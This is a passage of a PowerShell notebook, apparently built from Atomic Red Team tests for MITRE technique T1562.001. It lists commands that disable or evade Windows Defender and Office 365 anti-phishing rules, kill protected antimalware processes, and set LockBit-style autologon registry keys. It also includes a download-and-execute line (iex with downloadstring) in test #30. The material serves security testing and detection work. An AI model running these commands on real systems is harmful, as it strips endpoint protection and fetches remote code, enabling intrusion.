   "cell_type": "code",
   "execution_count": null,
   "id": "f5a1da96",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 22"
  },
  {
   "cell_type": "markdown",
   "id": "e94bacff",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$excludedpath= \"C:\\Temp\"\nRemove-MpPreference -ExclusionPath $excludedpath\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "672fa9c0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 22 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c10e407a",
   "metadata": {},
   "source": [
    "### Atomic Test #23 - Tamper with Windows Defender Evade Scanning -Extension",
    "Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$excludedExts= \".exe\"\nAdd-MpPreference -ExclusionExtension  $excludedExts```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d716c913",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 23"
  },
  {
   "cell_type": "markdown",
   "id": "4e7d9826",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$excludedExts= \".exe\"\nRemove-MpPreference -ExclusionExtension  $excludedExts -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "279f6a2d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 23 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ea833b7a",
   "metadata": {},
   "source": [
    "### Atomic Test #24 - Tamper with Windows Defender Evade Scanning -Process",
    "Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$excludedProcess = \"outlook.exe\"\nAdd-MpPreference -ExclusionProcess $excludedProcess```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5f4027a7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 24"
  },
  {
   "cell_type": "markdown",
   "id": "be459490",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$excludedProcess = \"outlook.exe\"\nRemove-MpPreference -ExclusionProcess  $excludedProcess\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dbcf3a7f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 24 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3486f82f",
   "metadata": {},
   "source": "### Atomic Test #25 - office-365-Disable-AntiPhishRule\nUsing the Disable-AntiPhishRule cmdlet to disable antiphish rules in your office-365 organization.\n\n**Supported Platforms:** office-365\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: ExchangeOnlineManagement PowerShell module must be installed\n\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name ExchangeOnlineManagement\nImport-Module ExchangeOnlineManagement\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a41436ca",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 25 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "18c86526",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nDisable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "955fcc5a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 25"
  },
  {
   "cell_type": "markdown",
   "id": "722923db",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nif(\"None\" -ne \"\") {\n$secure_pwd = (\"None\" + \"\") | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nEnable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n} \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "233682dc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 25 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4056870d",
   "metadata": {},
   "source": [
    "### Atomic Test #26 - Disable Windows Defender with DISM",
    "The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nDism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "be5728c5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 26"
  },
  {
   "cell_type": "markdown",
   "id": "e800b78f",
   "metadata": {},
   "source": "### Atomic Test #27 - Disable Defender with Defender Control\nAttempting to use Defender Control software to disable Windows Defender. Upon successful execution, Windows Defender will be turned off. \n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Defender Control must be installed on the machine. \n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:temp\\DefenderControl\\DefenderControl\\DefenderControl.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nStart-BitsTransfer -Source \"https://web.archive.org/web/20201210152711/https://www.sordum.org/files/download/defender-control/DefenderControl.zip\" -Destination \"$env:temp\\defendercontrol.zip\" -dynamic\nexpand-archive -LiteralPath \"$env:temp\\defendercontrol.zip\" -DestinationPath \"$env:temp\\DefenderControl\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4e188779",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 27 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "1f18d2eb",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncmd /c $env:temp\\DefenderControl\\DefenderControl\\DefenderControl.exe /D FFFF | Out-Null\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d3afae69",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 27"
  },
  {
   "cell_type": "markdown",
   "id": "0fef5ff2",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ncmd /c $env:temp\\DefenderControl\\DefenderControl\\DefenderControl.exe /E | Out-Null\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "08a0fb38",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 27 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4127dc88",
   "metadata": {},
   "source": "### Atomic Test #28 - Disable Defender Using NirSoft AdvancedRun\nInformation on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. \n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Advancedrun.exe must exist at #{AdvancedRun_Location}\n\n##### Check Prereq Commands:\n```powershell\nif(Test-Path -Path $env:temp\\AdvancedRun.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest \"http://www.nirsoft.net/utils/advancedrun.zip\" -OutFile \"$env:temp\\advancedrun.zip\"\nExpand-Archive -path \"$env:temp\\advancedrun.zip\" -destinationpath \"$env:temp\\\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "421b9989",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 28 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "3db97189",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nTry {cmd /c $env:temp\\AdvancedRun.exe /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\nif(0){\n  $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse\n  Try {cmd /c $env:temp\\AdvancedRun.exe /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f5e2c86f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 28"
  },
  {
   "cell_type": "markdown",
   "id": "4f156794",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nTry {cmd /c $env:temp\\AdvancedRun.exe /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"start WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "01335f60",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 28 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "72b8c89c",
   "metadata": {},
   "source": "### Atomic Test #29 - Kill antimalware protected processes using Backstab\nBackstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Backstab64.exe should exist in %temp%\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:temp\\Backstab64.exe) {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```powershell\nStart-BitsTransfer -Source \"https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe\" -Destination \"$env:temp\\Backstab64.exe\" -dynamic\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c1970ef0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 29 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "6e0a8dda",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n& $env:temp\\Backstab64.exe -k -n MsMpEng.exe```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4b10a382",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 29"
  },
  {
   "cell_type": "markdown",
   "id": "ac3cdfc1",
   "metadata": {},
   "source": [
    "### Atomic Test #30 - WinPwn - Kill the event log services for stealth",
    "Kill the event log services for stealth via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ninv-phantom -consoleoutput -noninteractive  ```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a473be64",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 30"
  },
  {
   "cell_type": "markdown",
   "id": "3bdf5a1d",
   "metadata": {},
   "source": [
    "### Atomic Test #31 - Tamper with Windows Defender ATP using Aliases - PowerShell",
    "Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-MpPreference -drtm $True\nSet-MpPreference -dbm $True\nSet-MpPreference -dscrptsc $True\nSet-MpPreference -dbaf $True\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a6f8a566",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 31"
  },
  {
   "cell_type": "markdown",
   "id": "ffcf7c1d",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nSet-MpPreference -drtm 0\nSet-MpPreference -dbm 0\nSet-MpPreference -dscrptsc 0\nSet-MpPreference -dbaf 0\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6f734e3a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 31 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "0115917a",
   "metadata": {},
   "source": [
    "### Atomic Test #32 - LockBit Black - Disable Privacy Settings Experience Using Registry -cmd",
    "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f03e0fa6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 32"
  },
  {
   "cell_type": "markdown",
   "id": "81fea571",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eca9dfa1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 32 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "02328fdb",
   "metadata": {},
   "source": [
    "### Atomic Test #33 - LockBit Black - Use Registry Editor to turn on automatic logon -cmd",
    "LockBit Black - Use Registry Editor to turn on automatic logon\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_DWORD /d 1 /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d Administrator /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /t REG_SZ /d contoso.com /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /t REG_SZ /d password1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "419384b3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 33"
  },
  {
   "cell_type": "markdown",
   "id": "ca08fb7e",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e87bd4b2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 33 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7069ad13",
   "metadata": {},
   "source": [
    "### Atomic Test #34 - LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell",
    "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 0 -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d1ff796e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 34"
  },
  {
   "cell_type": "markdown",
   "id": "ed7a1586",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "42728af3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 34 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f17ceb9d",
   "metadata": {},
   "source": [
    "### Atomic Test #35 - Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell",
    "Lockbit Black - Use Registry Editor to turn on automatic logon\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Value Administrator -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Value contoso.com -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword  -Value password1 -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "322d1bd6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 35"
  },
  {
   "cell_type": "markdown",
   "id": "d3fdb715",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "da1b6eef",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 35 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c374f20e",
   "metadata": {},
   "source": [
    "### Atomic Test #36 - Disable Windows Defender with PwSh Disable-WindowsOptionalFeature",
    "The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. \nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's packages.\nReference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Gui\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Features\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-ApplicationGuard\" -NoRestart -ErrorAction Ignore```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c1c1ac12",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 36"
  },
  {
   "cell_type": "markdown",
   "id": "b457cba7",
   "metadata": {},
   "source": [
    "### Atomic Test #37 - WMIC Tamper with Windows Defender Evade Scanning Folder",
    "The following Atomic will attempt to exclude a folder within Defender leveraging WMI\nReference: https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"ATOMICREDTEAM\\\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c0d42a6c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 37"
  },
  {
   "cell_type": "markdown",
   "id": "fc236a6b",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nwmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Remove ExclusionPath=\\\"ATOMICREDTEAM\\\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f459e9a1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 37 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9b798c17",
   "metadata": {},
   "source": "### Atomic Test #38 - Delete Windows Defender Scheduled Tasks\nThe following atomic test will delete the Windows Defender scheduled tasks.\n\n[Reference](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `command_prompt`!\n##### Description: The Windows Defender scheduled tasks must be backed up first\n\n##### Check Prereq Commands:\n```cmd\nIF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( EXIT 0 ) ELSE ( EXIT 1 )\n\n```\n##### Get Prereq Commands:\n```cmd\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" > \"%temp%\\Windows_Defender_Scheduled_Scan.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" > \"%temp%\\Windows_Defender_Cleanup.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" > \"%temp%\\Windows_Defender_Verification.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" > \"%temp%\\Windows_Defender_Cache_Maintenance.xml\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8125c97e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 38 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "aed68e02",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nIF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cleanup.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Verification.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f )\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d58c82c7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 38"
  },
  {
   "cell_type": "markdown",
   "id": "09836c13",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nschtasks /create /xml \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Cleanup.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Verification.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6a54f17d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 38 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "dac4e432",
   "metadata": {},
   "source": "## Detection\nMonitor processes and command-line arguments to see if security tools/services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Monitoring for changes to other known features used by deployed security tools may also expose malicious activity.\n\nLack of expected log events may be suspicious."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}